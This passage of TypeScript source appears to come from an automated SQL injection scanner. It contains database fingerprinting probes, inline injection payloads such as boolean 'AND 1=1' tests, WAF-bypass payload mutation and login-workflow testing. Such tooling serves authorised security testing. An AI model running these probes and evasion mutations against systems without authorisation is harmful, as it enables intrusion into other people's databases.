    await this.onLog("info", `[Fingerprint] Probe 4/5: Testing numeric context...`);
    const numericPayload = CONTEXT_PROBE_PAYLOADS.numericMath;
    const numResponse = await this.request(injectPayload(url, paramName, numericPayload), { timeout: 5000 });
    if (!numResponse.error) {
      // If the response is similar to baseline with id=2, it's processing math
      const testUrl2 = injectPayload(url, paramName, "2");
      const response2 = await this.request(testUrl2, { timeout: 5000 });
      if (!response2.error && hashString(numResponse.body) === hashString(response2.body)) {
        probeResult.numericMathWorks = true;
      }
    }
    await sleep(50);

    // PROBE 5: DB-specific error triggers
    await this.onLog("info", `[Fingerprint] Probe 5/5: Testing DB-specific triggers...`);
    for (const [db, payload] of Object.entries(CONTEXT_PROBE_PAYLOADS.dbTriggers)) {
      if (this.checkCancellation()) break;
      const dbPayload = originalValue + payload;
      const dbResponse = await this.request(injectPayload(url, paramName, dbPayload), { timeout: 5000 });
      if (!dbResponse.error) {
        const dbPatterns = this.extractErrorPatterns(dbResponse.body);
        if (dbPatterns.dbType !== "unknown") {
          probeResult.dbType = dbPatterns.dbType;
          await this.onLog("info", `[Fingerprint] DB-specific trigger matched: ${db} -> ${dbPatterns.dbType}`);
          break;
        }
      }
      await sleep(30);
    }

    // Determine injection context based on probe results
    if (/^\d+$/.test(originalValue)) {
      if (probeResult.numericMathWorks) {
        probeResult.context = "numeric";
      } else if (probeResult.singleQuoteError) {
        probeResult.context = "numeric_quoted";
      } else {
        probeResult.context = "numeric";
      }
    } else if (probeResult.doubleQuoteError && !probeResult.singleQuoteError) {
      probeResult.context = "double_quote";
    } else if (probeResult.singleQuoteError) {
      if (probeResult.parenthesisError) {
        probeResult.context = "string_parenthesis";
      } else {
        probeResult.context = "string";
      }
    } else if (probeResult.parenthesisError) {
      probeResult.context = "parenthesis";
    } else {
      probeResult.context = "unknown";
    }

    // Store in module state
    this.detectedDbType = probeResult.dbType as DatabaseType;
    this.detectedContext = probeResult.context;

    // Store in ExecutionController if available
    if (this.executionController) {
      const ec = this.executionController as any;
      if (ec.setDetectedDbType) {
        ec.setDetectedDbType(probeResult.dbType);
      }
      if (ec.setDetectedContext) {
        ec.setDetectedContext(probeResult.context);
      }
    }

    // Cache the result
    this.contextProbeCache.set(cacheKey, probeResult);

    await this.onLog("info", `[Fingerprint] Pre-scan complete: DB=${probeResult.dbType}, context=${probeResult.context}, patterns=${probeResult.detectedPatterns.length}`);
    
    return { dbType: probeResult.dbType, context: probeResult.context };
  }

  private filterPayloadsForContext(payloads: string[], context: string, dbType: string): string[] {
    let filtered = payloads;
    const originalCount = payloads.length;

    if (context === "numeric" || context === "numeric_quoted") {
      // For numeric context, prioritize payloads without leading quotes
      filtered = payloads.filter(p => {
        const startsWithQuote = p.startsWith("'") || p.startsWith('"');
        const hasNumericPrefix = /^[0-9\-]/.test(p) || p.startsWith(" ") || p.startsWith(")");
        // Keep payloads that don't start with quotes or have numeric prefixes
        return !startsWithQuote || hasNumericPrefix;
      });
      // If too aggressive, add back some quote payloads with numeric prefixes
      if (filtered.length < originalCount * 0.3) {
        const numericVariants = payloads
          .filter(p => p.startsWith("'"))
          .map(p => "1" + p)
          .slice(0, 20);
        filtered = [...filtered, ...numericVariants];
      }
    } else if (context === "double_quote") {
      // For double quote context, prioritize double quote payloads
      filtered = payloads.filter(p => {
        return p.includes('"') || !p.startsWith("'");
      });
      // Also add variants with double quotes
      const singleQuotePayloads = payloads.filter(p => p.startsWith("'") && !p.includes('"'));
      const doubleQuoteVariants = singleQuotePayloads
        .map(p => p.replace(/'/g, '"'))
        .slice(0, 30);
      filtered = [...filtered, ...doubleQuoteVariants];
    } else if (context === "string_parenthesis" || context === "parenthesis") {
      // For parenthesis context, prioritize payloads with closing parentheses
      filtered = payloads.filter(p => {
        return p.includes(")") || p.startsWith("')") || p.startsWith("))");
      });
      // Add parenthesis variants
      if (filtered.length < originalCount * 0.3) {
        const parenVariants = payloads
          .filter(p => p.startsWith("'"))
          .map(p => "'" + p.substring(1).replace(/^['"]/, ")"))
          .slice(0, 20);
        filtered = [...filtered, ...parenVariants];
      }
    } else if (context === "string") {
      // For string context, single quote payloads are preferred
      filtered = payloads.filter(p => {
        return p.startsWith("'") || p.startsWith(" ") || !p.startsWith('"');
      });
    }

    // Filter by database type if detected
    if (dbType !== "unknown") {
      const dbLower = dbType.toLowerCase();
      filtered = filtered.filter(p => {
        const pLower = p.toLowerCase();
        // Keep generic payloads and DB-specific ones
        const isMySqlSpecific = pLower.includes("sleep(") || pLower.includes("extractvalue") || pLower.includes("updatexml");
        const isPgSpecific = pLower.includes("pg_sleep") || pLower.includes("::int");
        const isMssqlSpecific = pLower.includes("waitfor") || pLower.includes("convert(int");
        const isOracleSpecific = pLower.includes("utl_inaddr") || pLower.includes("from dual");
        const isSqliteSpecific = pLower.includes("sqlite_version") || pLower.includes("randomblob");

        const isDbSpecific = isMySqlSpecific || isPgSpecific || isMssqlSpecific || isOracleSpecific || isSqliteSpecific;
        
        if (!isDbSpecific) return true; // Keep generic payloads
        
        // Only keep DB-specific payloads matching detected DB
        if (dbLower === "mysql" && isMySqlSpecific) return true;
        if (dbLower === "postgresql" && isPgSpecific) return true;
        if (dbLower === "mssql" && isMssqlSpecific) return true;
        if (dbLower === "oracle" && isOracleSpecific) return true;
        if (dbLower === "sqlite" && isSqliteSpecific) return true;
        
        return false;
      });
    }

    // Ensure we have unique payloads
    filtered = Array.from(new Set(filtered));

    // Ensure we don't filter too aggressively - keep at least 30% of payloads
    if (filtered.length < originalCount * 0.3) {
      filtered = payloads.slice(0, Math.max(filtered.length, Math.floor(originalCount * 0.3)));
    }

    return filtered;
  }

  logDiagnostics(): { 
    totalVulns: number; 
    confirmedVulns: number;
    payloadClassStats: Record<PayloadClass, number>;
    negativeParams: number;
    effectivePayloads: number;
  } {
    const stats: Record<PayloadClass, number> = {
      "error": 0,
      "union": 0,
      "blind-boolean": 0,
      "blind-time": 0,
      "stacked": 0
    };
    
    for (const vuln of this.foundVulnerabilities) {
      if (vuln.type && stats[vuln.type] !== undefined) {
        stats[vuln.type]++;
      }
    }
    
    const confirmed = this.foundVulnerabilities.filter(v => 
      v.confidenceLevel === "CONFIRMED" || v.confidenceLevel === "HIGHLY_LIKELY"
    ).length;
    
    return {
      totalVulns: this.foundVulnerabilities.length,
      confirmedVulns: confirmed,
      payloadClassStats: stats,
      negativeParams: this.foundSqliForParam.size,
      effectivePayloads: this.effectivePayloads.size
    };
  }

  getAutoTuningSuggestions(): string[] {
    const suggestions: string[] = [];
    const diagnostics = this.logDiagnostics();
    
    // Check if we're finding vulns
    if (diagnostics.totalVulns === 0) {
      suggestions.push("No vulnerabilities found - consider adjusting baseline tolerance");
      suggestions.push("Increase boolean probe variations");
    }
    
    // Check payload class distribution
    if (diagnostics.payloadClassStats["error"] === 0) {
      suggestions.push("No error-based detections - verify DB error patterns are comprehensive");
    }
    
    if (diagnostics.payloadClassStats["blind-boolean"] === 0 && diagnostics.payloadClassStats["error"] > 0) {
      suggestions.push("Error-based working but no boolean - structural comparison may need tuning");
    }
    
    if (diagnostics.confirmedVulns === 0 && diagnostics.totalVulns > 0) {
      suggestions.push("Findings exist but none confirmed - increase stability test count");
    }
    
    return suggestions;
  }

  private async testUrlWithAdaptiveDetection(url: string): Promise<void> {
    if (this.checkCancellation()) return;
    
    const params = extractParameters(url);
    
    const sortedParams = params.sort((a, b) => {
      const priorityA = this.classifySqlPriority(a.name, a.value);
      const priorityB = this.classifySqlPriority(b.name, b.value);
      const order: Record<SQLPriority, number> = { high: 0, medium: 1, low: 2 };
      return order[priorityA] - order[priorityB];
    });
    
    for (const param of sortedParams) {
      if (this.checkCancellation()) {
        await this.onLog("info", "[Cancelled] Scan aborted during parameter testing");
        return;
      }
      
      const paramKey = `${url}:${param.name}`;
      
      if (this.foundSqliForParam.has(paramKey)) continue;
      
      // Zero-Speed Directive: Disabled negative cache skip - test all parameters every scan
      // Prior scan results should not affect current scan to ensure work queue exhaustion
      // if (negativeCache.isNegative(url, param.name)) { ... }
      
      // CRITICAL: Count parameter as tested BEFORE attempting - this ensures we track
      // attempted tests even on baseline failures, timeouts, or other early exits
      this.executionController?.incrementParametersTested?.();
      
      try {
        await this.testParameterWithTimeout(url, param.name, param.value, PARAMETER_TOTAL_TIMEOUT);
      } catch (error: any) {
        if (error.message === "PARAMETER_TIMEOUT") {
          await this.onLog("warn", `[Timeout] Parameter '${param.name}' exceeded ${PARAMETER_TOTAL_TIMEOUT / 1000}s limit - moving to next`);
          negativeCache.markNegative(url, param.name, "timeout");
        } else {
          await this.onLog("error", `[Error] Testing '${param.name}' failed: ${error.message}`);
        }
      }
    }
  }

  private async testParameterWithTimeout(url: string, paramName: string, paramValue: string, timeoutMs: number): Promise<void> {
    const timeoutPromise = new Promise<never>((_, reject) => {
      setTimeout(() => reject(new Error("PARAMETER_TIMEOUT")), timeoutMs);
    });

    const testPromise = this.executeParameterTest(url, paramName, paramValue);

    await Promise.race([testPromise, timeoutPromise]);
  }

  private async executeParameterTest(url: string, paramName: string, paramValue: string): Promise<void> {
    await this.onLog("info", `[Discovery] Analyzing parameter '${paramName}'...`);
    
    // PRE-SCAN FINGERPRINTING PHASE: Run context probe before main testing
    const probeResult = await this.runContextProbe(url, paramName);
    await this.onLog("info", `[Fingerprint] Pre-scan result for '${paramName}': DB=${probeResult.dbType}, context=${probeResult.context}`);
    
    const context = await this.discoverParameterContext(url, paramName, paramValue);
    
    // Override inferred backend with probe result if detected
    if (probeResult.dbType !== "unknown") {
      context.inferredBackend = probeResult.dbType as DatabaseType;
    }
    
    await this.onLog("info", `[Discovery] Parameter '${paramName}': type=${context.type}, backend=${context.inferredBackend}, priority=${context.sqlPriority}`);
    
    const baseline = await this.establishBaseline(url, paramName);
    if (!baseline) {
      await this.onLog("info", `Skipping '${paramName}' - failed to establish baseline`);
      return;
    }

    await this.onLog("info", `[Baseline] Established: mean=${baseline.latencyBaseline.mean.toFixed(0)}ms, stdDev=${baseline.latencyBaseline.stdDev.toFixed(0)}ms`);

    // Zero-Speed Directive: Do NOT skip slow-responding URLs - log warning instead
    if (baseline.avgTime > 3000) {
      await this.onLog("warn", `[Warning] Slow-responding URL (baseline: ${Math.round(baseline.avgTime)}ms) - continuing per Zero-Speed Directive`);
    }

    const adaptiveResult = await this.adaptiveSQLDetection(url, paramName, baseline, context);
    
    // Zero-Speed Directive: NO early rejection - always run full payload suite
    // Log for diagnostics but continue testing regardless of initial confidence
    
    if (adaptiveResult.shouldEscalate) {
      await this.onLog("info", `[Adaptive] Differential behavior detected for '${paramName}' - running full payload suite`);
    } else {
      await this.onLog("info", `[Adaptive] No early indicators for '${paramName}' (priority: ${context.sqlPriority}) - still running full suite for coverage`);
    }
    
    await this.testUrlWithSequenceContext(url, paramName, baseline, context, undefined, undefined, true);
  }

  private async adaptiveSQLDetection(
    url: string,
    paramName: string,
    baseline: BaselineMetrics,
    context: ParameterContext
  ): Promise<AdaptiveProbeResult> {
    await this.onLog("info", `[Adaptive] Phase 1: Boolean logic probes for '${paramName}'...`);
    
    const result: AdaptiveProbeResult = {
      hasDifferentialBehavior: false,
      confidence: 0,
      trueHash: "",
      falseHash: "",
      shouldEscalate: false,
      evidence: "",
    };

    const booleanProbes = [
      { true: "' AND 1=1--", false: "' AND 1=2--" },
      { true: " AND 1=1--", false: " AND 1=2--" },
      { true: "' OR '1'='1", false: "' OR '1'='2" },
    ];

    const urlPattern = this.getUrlPattern(url);
    const priorEffective = this.effectivePayloads.get(urlPattern);
    
    if (priorEffective && priorEffective.length > 0) {
      for (const payload of priorEffective.slice(0, 2)) {
        if (this.checkCancellation()) return result;
        const response = await this.makeDefenseAwareRequest(url, paramName, payload);
        if (!response.error && response.status === 200) {
          const { patterns } = this.extractErrorPatterns(response.body);
          if (patterns.length > 0) {
            result.shouldEscalate = true;
            result.confidence = 70;
            result.evidence = `Prior effective payload triggered: ${patterns[0]}`;
            return result;
          }
        }
      }
    }

    for (const probe of booleanProbes) {
      if (this.checkCancellation()) return result;
      
      const truePayload = context.type === "numeric" ? `1${probe.true}` : probe.true;
      const falsePayload = context.type === "numeric" ? `1${probe.false}` : probe.false;

      const trueResponses: RequestResult[] = [];
      const falseResponses: RequestResult[] = [];
      
      for (let i = 0; i < 3; i++) {
        if (this.checkCancellation()) break;
        const trueResp = await this.makeDefenseAwareRequest(url, paramName, truePayload);
        const falseResp = await this.makeDefenseAwareRequest(url, paramName, falsePayload);
        
        if (!trueResp.error) trueResponses.push(trueResp);
        if (!falseResp.error) falseResponses.push(falseResp);
        
        await sleep(50);
      }

      if (trueResponses.length < 2 || falseResponses.length < 2) continue;

      const trueNormalized = trueResponses.map(r => this.normalizeResponseForDiff(r.body));
      const falseNormalized = falseResponses.map(r => this.normalizeResponseForDiff(r.body));
      
      const trueHashes = trueNormalized.map(n => hashString(n));
      const falseHashes = falseNormalized.map(n => hashString(n));

      const trueConsistent = trueHashes.every(h => h === trueHashes[0]);
      const falseConsistent = falseHashes.every(h => h === falseHashes[0]);
      const trueAndFalseDifferent = trueHashes[0] !== falseHashes[0];

      const trueLengths = trueResponses.map(r => r.body.length);
      const falseLengths = falseResponses.map(r => r.body.length);
      const avgTrueLen = trueLengths.reduce((a, b) => a + b, 0) / trueLengths.length;
      const avgFalseLen = falseLengths.reduce((a, b) => a + b, 0) / falseLengths.length;
      const lengthDiffRatio = Math.abs(avgTrueLen - avgFalseLen) / Math.max(avgTrueLen, avgFalseLen);
      const significantLengthDiff = lengthDiffRatio > BODY_LENGTH_TOLERANCE;

      const headersDifferent = this.compareHeaders(trueResponses[0].headers, falseResponses[0].headers);

      const structuralDiff = this.compareStructural(trueResponses[0].body, falseResponses[0].body);
      const statusDiff = trueResponses[0].status !== falseResponses[0].status;

      if ((trueConsistent && falseConsistent && trueAndFalseDifferent) || 
          (significantLengthDiff && trueConsistent && falseConsistent) ||
          structuralDiff.isSignificantDiff ||
          statusDiff ||
          headersDifferent) {
        result.hasDifferentialBehavior = true;
        result.trueHash = trueHashes[0];
        result.falseHash = falseHashes[0];
        result.shouldEscalate = true;
        result.confidence = 60;
        result.evidence = trueAndFalseDifferent 
          ? "Boolean conditions produce consistent differential responses"
          : structuralDiff.isSignificantDiff
            ? `Structural difference: ${structuralDiff.evidence}`
            : significantLengthDiff 
              ? `Length difference: ${avgTrueLen.toFixed(0)} vs ${avgFalseLen.toFixed(0)}`
              : statusDiff
                ? `Status difference: ${trueResponses[0].status} vs ${falseResponses[0].status}`
                : "Header differences detected";
        
        this.trackEffectivePayload(urlPattern, truePayload);
        return result;
      }
    }

    const errorProbe = context.type === "numeric" ? "1'" : "'";
    const errorResponse = await this.makeDefenseAwareRequest(url, paramName, errorProbe);
    if (!errorResponse.error) {
      const { patterns, dbType } = this.extractErrorPatterns(errorResponse.body);
      if (patterns.length > 0) {
        result.shouldEscalate = true;
        result.confidence = 80;
        result.evidence = `SQL error patterns detected: ${patterns[0]}`;
        if (dbType !== "unknown") {
          this.detectedDbType = dbType;
        }
        this.trackEffectivePayload(urlPattern, errorProbe);
        return result;
      }
    }

    return result;
  }

  private normalizeResponseForDiff(html: string): string {
    let normalized = html;
    
    // Remove script and style blocks entirely
    normalized = normalized.replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '');
    normalized = normalized.replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '');
    
    // Remove all inline event handlers
    normalized = normalized.replace(/\son\w+\s*=\s*["'][^"']*["']/gi, '');
    
    // Remove timestamps (various formats) - combined into single regex for performance
    normalized = normalized.replace(/(?:\d{4}[-\/]\d{2}[-\/]\d{2}[T\s]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:[Zz]|[+-]\d{2}:\d{2})?|\d{2}[-\/]\d{2}[-\/]\d{4}[T\s]\d{2}:\d{2}:\d{2}|\b\d{10,13}\b)/g, '[TIMESTAMP]');
    
    // Remove UUIDs
    normalized = normalized.replace(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi, '[UUID]');
    
    // Remove session tokens and CSRF values
    normalized = normalized.replace(/["']?(?:csrf|token|nonce|_token|authenticity_token|session|sessid|phpsessid|jsessionid)["']?\s*[=:]\s*["']?[A-Za-z0-9_\-+/=]{16,}["']?/gi, '[SESSION_TOKEN]');
    
    // Remove cache busters
    normalized = normalized.replace(/[?&](?:v|ver|version|_|t|ts|timestamp|cache|cb|nocache|rand|random)\s*=\s*[0-9a-zA-Z_.-]+/gi, '');
    
    // Remove dynamic IDs (random hex or alphanumeric)
    normalized = normalized.replace(/\bid\s*=\s*["']?(?:_|uid_|gen_|tmp_|rand_)?[a-f0-9]{8,}["']?/gi, 'id="[DYNAMIC_ID]"');
    
    // Remove nonce values
    normalized = normalized.replace(/\bnonce\s*=\s*["'][^"']+["']/gi, 'nonce="[NONCE]"');
    
    // Remove ad container content (common patterns)
    normalized = normalized.replace(/<(?:div|span|iframe)[^>]*(?:class|id)\s*=\s*["'][^"']*(?:ad|ads|advert|banner|sponsor|promo|tracking)[^"']*["'][^>]*>[\s\S]*?<\/(?:div|span|iframe)>/gi, '[AD_CONTENT]');
    
    // Remove tracking pixels
    normalized = normalized.replace(/<img[^>]*(?:1x1|pixel|tracking|beacon|analytics)[^>]*>/gi, '[TRACKING_PIXEL]');
    
    // Normalize whitespace (collapse multiple spaces/newlines)
    normalized = normalized.replace(/\s+/g, ' ');
    
    // Normalize quotes
    normalized = normalized.replace(/[""'']/g, '"');
    
    // Remove empty attributes
    normalized = normalized.replace(/\s+(?:class|style|id)\s*=\s*["']\s*["']/gi, '');
    
    // Trim
    normalized = normalized.trim();
    
    return normalized;
  }

  private compareStructural(bodyA: string, bodyB: string): { 
    isSignificantDiff: boolean; 
    evidence: string; 
    metrics: { linkDiff: number; imageDiff: number; tableDiff: number; rowDiff: number; formDiff: number; textBlocksDiff: number } 
  } {
    // Extract structural elements using simple patterns (faster than DOM parsing)
    const countPattern = (html: string, pattern: RegExp): number => {
      const matches = html.match(pattern);
      return matches ? matches.length : 0;
    };
    
    const extractTextBlocks = (html: string): string[] => {
      // Remove tags and split by whitespace, filter short blocks
      const text = html.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
      return text.split(/\s{2,}/).filter(block => block.length > 20);
    };
    
    const linksA = countPattern(bodyA, /<a\b[^>]*>/gi);
    const linksB = countPattern(bodyB, /<a\b[^>]*>/gi);
    
    const imagesA = countPattern(bodyA, /<img\b[^>]*>/gi);
    const imagesB = countPattern(bodyB, /<img\b[^>]*>/gi);
    
    const tablesA = countPattern(bodyA, /<table\b[^>]*>/gi);
    const tablesB = countPattern(bodyB, /<table\b[^>]*>/gi);
    
    const rowsA = countPattern(bodyA, /<tr\b[^>]*>/gi);
    const rowsB = countPattern(bodyB, /<tr\b[^>]*>/gi);
    
    const formsA = countPattern(bodyA, /<form\b[^>]*>/gi);
    const formsB = countPattern(bodyB, /<form\b[^>]*>/gi);
    
    const textBlocksA = extractTextBlocks(bodyA);
    const textBlocksB = extractTextBlocks(bodyB);
    
    // Calculate differences
    const linkDiff = Math.abs(linksA - linksB);
    const imageDiff = Math.abs(imagesA - imagesB);
    const tableDiff = Math.abs(tablesA - tablesB);
    const rowDiff = Math.abs(rowsA - rowsB);
    const formDiff = Math.abs(formsA - formsB);
    
    // Check for missing text blocks (content that exists in one but not the other)
    const missingBlocks = textBlocksA.filter(block => !textBlocksB.some(b => b.includes(block.substring(0, 30))));
    const textBlocksDiff = missingBlocks.length;
    
    // Significant if structural differences are detected
    const isSignificantDiff = (
      rowDiff > 0 ||           // Different number of table rows (very significant for data)
      linkDiff > 2 ||          // More than 2 links different
      tableDiff > 0 ||         // Different number of tables
      formDiff > 0 ||          // Different number of forms
      textBlocksDiff > 1       // More than 1 text block missing
    );
    
    const evidence = isSignificantDiff
      ? `Structural diff: links=${linkDiff}, images=${imageDiff}, tables=${tableDiff}, rows=${rowDiff}, forms=${formDiff}, textBlocks=${textBlocksDiff}`
      : `Minor structural diff: links=${linkDiff}, rows=${rowDiff}`;
    
    return {
      isSignificantDiff,
      evidence,
      metrics: { linkDiff, imageDiff, tableDiff, rowDiff, formDiff, textBlocksDiff }
    };
  }

  private compareHeaders(headers1: Record<string, string>, headers2: Record<string, string>): boolean {
    const relevantHeaders = ["x-powered-by", "server", "content-type", "x-frame-options"];
    
    for (const header of relevantHeaders) {
      const val1 = headers1[header] || headers1[header.toLowerCase()];
      const val2 = headers2[header] || headers2[header.toLowerCase()];
      if (val1 !== val2) return true;
    }
    
    return false;
  }

  private classifySqlPriority(paramName: string, value: string): SQLPriority {
    if (/^\d+$/.test(value)) {
      return "high";
    }
    
    for (const pattern of HIGH_PRIORITY_PARAMS) {
      if (pattern.test(paramName)) return "high";
    }
    
    for (const pattern of MEDIUM_PRIORITY_PARAMS) {
      if (pattern.test(paramName)) return "medium";
    }
    
    for (const pattern of LOW_PRIORITY_PARAMS) {
      if (pattern.test(paramName)) return "low";
    }
    
    return "medium";
  }

  private getUrlPattern(url: string): string {
    try {
      const parsed = new URL(url);
      return `${parsed.hostname}${parsed.pathname}`;
    } catch {
      return url.split("?")[0];
    }
  }

  private trackEffectivePayload(urlPattern: string, payload: string): void {
    const existing = this.effectivePayloads.get(urlPattern) || [];
    if (!existing.includes(payload)) {
      existing.push(payload);
      this.effectivePayloads.set(urlPattern, existing.slice(-10));
    }
  }

  private applyWAFBypassMutations(payload: string): string[] {
    const mutations: string[] = [payload];
    
    for (const [, mutator] of Object.entries(WAF_BYPASS_MUTATIONS)) {
      const mutated = mutator(payload);
      mutations.push(...mutated);
    }
    
    const tampingStrategies = globalPayloadRepository.getTampingStrategies();
    const safeTampingStrategies = tampingStrategies.filter(s => 
      !s.name.includes("url_encode") && 
      !s.name.includes("hex_encode") && 
      !s.name.includes("html_entity")
    );
    
    const shuffled = [...safeTampingStrategies].sort(() => Math.random() - 0.5);
    for (const strategy of shuffled.slice(0, 3)) {
      mutations.push(strategy.transform(payload));
    }
    
    return Array.from(new Set(mutations));
  }

  private detectWorkflows(urls: string[]): WorkflowSession[] {
    const workflows: WorkflowSession[] = [];
    const authPatterns = [/login/i, /signin/i, /auth/i];
    const profilePatterns = [/profile/i, /account/i, /user/i, /dashboard/i];
    const actionPatterns = [/update/i, /edit/i, /delete/i, /submit/i, /action/i];

    const authUrls = urls.filter(url => authPatterns.some(p => p.test(url)));
    const profileUrls = urls.filter(url => profilePatterns.some(p => p.test(url)));
    const actionUrls = urls.filter(url => actionPatterns.some(p => p.test(url)));

    if (authUrls.length > 0 && (profileUrls.length > 0 || actionUrls.length > 0)) {
      const workflow: WorkflowSession = {
        id: `workflow_${randomString(8)}`,
        steps: [],
        cookies: {},
        sessionToken: null,
        csrfToken: null,
      };

      if (authUrls[0]) {
        workflow.steps.push({
          name: "login",
          url: authUrls[0],
          method: "POST",
          parameters: [
            { name: "username", value: "test" },
            { name: "password", value: "test" },
          ],
        });
      }

      if (profileUrls[0]) {
        workflow.steps.push({
          name: "profile",
          url: profileUrls[0],
          method: "GET",
          parameters: extractParameters(profileUrls[0]),
        });
      }

      if (actionUrls[0]) {
        workflow.steps.push({
          name: "action",
          url: actionUrls[0],
          method: "POST",
          parameters: extractParameters(actionUrls[0]),
        });
      }

      if (workflow.steps.length >= 2) {
        workflows.push(workflow);
      }
    }

    return workflows;
  }

  private async testWorkflow(workflow: WorkflowSession): Promise<void> {
    await this.onLog("info", `[Sequence] Testing workflow ${workflow.id} with ${workflow.steps.length} steps`);
    this.workflowSessions.set(workflow.id, workflow);

    let sessionCookies: Record<string, string> = {};

    for (let stepIndex = 0; stepIndex < workflow.steps.length; stepIndex++) {
      const step = workflow.steps[stepIndex];
      await this.onLog("info", `[Sequence] Step ${stepIndex + 1}/${workflow.steps.length}: ${step.name} (${step.url})`);

      const stepResponse = await this.executeWorkflowStep(step, sessionCookies);
      if (stepResponse && !stepResponse.error) {
        const setCookies = this.extractCookies(stepResponse.headers);
        sessionCookies = { ...sessionCookies, ...setCookies };
        workflow.cookies = sessionCookies;

        const csrfToken = this.extractCSRFToken(stepResponse.body);
        if (csrfToken) {
          workflow.csrfToken = csrfToken;
        }
      }

      for (const param of step.parameters) {
        const paramKey = `${step.url}:${param.name}`;
        if (this.foundSqliForParam.has(paramKey)) continue;

        // CRITICAL: Count parameter as tested (was missing, causing parametersTested: 0)
        this.executionController?.incrementParametersTested?.();

        const context = await this.discoverParameterContext(step.url, param.name, param.value);
        const baseline = await this.establishBaseline(step.url, param.name, sessionCookies);
        if (!baseline) continue;

        await this.testUrlWithSequenceContext(
          step.url,
          param.name,
          baseline,
          context,
          sessionCookies,
          {
            workflowId: workflow.id,
            stepIndex,
            stepName: step.name,
          }
        );
      }
    }
  }

  private async executeWorkflowStep(step: WorkflowStep, cookies: Record<string, string>): Promise<RequestResult | null> {
    const cookieHeader = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join("; ");
    const headers: Record<string, string> = {
      ...step.headers,
      ...(cookieHeader ? { Cookie: cookieHeader } : {}),
    };

    try {
      return await this.request(step.url, {
        method: step.method,
        headers,
        timeout: 10000,
      });
    } catch {
      return null;
    }
  }

  private extractCookies(headers: Record<string, string>): Record<string, string> {
    const cookies: Record<string, string> = {};
    const setCookieHeader = headers["set-cookie"] || headers["Set-Cookie"];
    
    if (setCookieHeader) {
      const cookieStrings = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
      for (const cookieStr of cookieStrings) {
        const match = cookieStr.match(/^([^=]+)=([^;]*)/);
        if (match) {
          cookies[match[1]] = match[2];
        }
      }
    }
    
    return cookies;
  }

  private extractCSRFToken(body: string): string | null {
    const patterns = [
      /<input[^>]*name=["']?_?csrf[^"']*["']?[^>]*value=["']([^"']+)["']/i,
      /<input[^>]*value=["']([^"']+)["'][^>]*name=["']?_?csrf[^"']*["']?/i,
      /<meta[^>]*name=["']?csrf-token["']?[^>]*content=["']([^"']+)["']/i,
    ];

    for (const pattern of patterns) {
      const match = body.match(pattern);
      if (match) return match[1];
    }

    return null;
  }

  private async testUrlWithSequenceContext(
    url: string,
    paramName: string,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>,
    sequenceContext?: { workflowId: string; stepIndex: number; stepName: string },
    skipAdaptiveProbe?: boolean
  ): Promise<void> {
    const paramKey = `${url}:${paramName}`;
    const urlPattern = this.getUrlPattern(url);
    this.payloadClassResults.set(paramKey, []);

    const wafProfile = this.defenseAwareness.getWAFProfile();
    if (!wafProfile.detected) {
      await this.detectWAFWithDefenseAwareness(url, paramName);
    }

    if (!skipAdaptiveProbe) {
      const probeResult = await this.adaptiveSQLDetection(url, paramName, baseline, context);
      // Zero-Speed Directive: NO early rejection - log diagnostics but continue testing
      if (!probeResult.shouldEscalate && probeResult.confidence < 30) {
        await this.onLog("info", `[SQLi] Low initial confidence for '${paramName}' (${probeResult.confidence}%) - continuing full test per Zero-Speed Directive`);
      }
    }

    const classResults = await this.testAllPayloadClasses(url, paramName, baseline, context, sessionCookies);
    this.payloadClassResults.set(paramKey, classResults);

    // Cache negative results if no payload classes succeeded
    const anySuccess = classResults.some(r => r.success);
    if (!anySuccess) {
      negativeCache.markNegative(url, paramName, `Tested ${classResults.length} payload classes with no success`);
      await this.onLog("info", `[Cache] Marked '${paramName}' as non-injectable after full testing`);
    }

    const successfulClasses = classResults.filter(r => r.success);
    
    if (successfulClasses.length === 0) {
      return;
    }

    await this.onLog("info", `[PayloadClass] ${successfulClasses.length}/${classResults.length} payload classes succeeded for '${paramName}'`);

    const { level, confidence, stabilityScore } = await this.calculateConfidenceLevel(
      successfulClasses,
      url,
      paramName,
      classResults[0]?.payload || "",
      classResults[0]?.class || "error",
      baseline,
      context,
      sessionCookies
    );

    // AGGRESSIVE SQL MODE: Detection comes FIRST, verification AFTER
    // Only reject if truly no signal. POTENTIAL findings ARE reported.
    if (level === "REJECTED") {
      await this.onLog("info", `[Confidence] ${level} (${confidence}%) - insufficient evidence`);
      return;
    }
    
    // Report POTENTIAL findings (previously suppressed) - user directive: silence is unacceptable
    await this.onLog("info", `[Confidence] ${level} (${confidence}%) - REPORTING (detection first policy)`);

    const primaryResult = successfulClasses[0];
    const result: SQLiResult = {
      vulnerable: true,
      type: primaryResult.class,
      payload: primaryResult.payload,
      evidence: primaryResult.evidence,
      parameter: paramName,
      confidence,
      confidenceLevel: level,
      verificationStatus: (level === "CONFIRMED" || level === "HIGHLY_LIKELY") ? "confirmed" : "potential",
      verificationDetails: `${successfulClasses.length} payload classes confirmed. Stability: ${stabilityScore}%. Classes: ${successfulClasses.map(c => c.class).join(", ")}`,
      dbType: context.inferredBackend !== "unknown" ? context.inferredBackend : this.detectedDbType,
      wafDetected: wafProfile.detected,
      confirmationCount: primaryResult.confirmations,
      baselineComparison: `Baseline: ${baseline.latencyBaseline.mean.toFixed(0)}ms`,
      stabilityScore,
      payloadClassesAttempted: classResults.map(c => c.class),
      payloadClassesSucceeded: successfulClasses.map(c => c.class),
      sequenceContext,
    };

    this.foundVulnerabilities.push(result);
    await this.reportVulnerability(result, url);
    this.foundSqliForParam.add(paramKey);
    
    for (const successful of successfulClasses) {
      this.trackEffectivePayload(urlPattern, successful.payload);
    }
  }

  private async calculateConfidenceLevel(
    successfulClasses: PayloadClassResult[],
    url: string,
    paramName: string,
    payload: string,
    payloadClass: PayloadClass,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>
  ): Promise<{ level: ConfidenceLevel; confidence: number; stabilityScore: number }> {
    const classCount = successfulClasses.length;
    
    // AGGRESSIVE SQL MODE: Use lower thresholds for known vulnerable targets
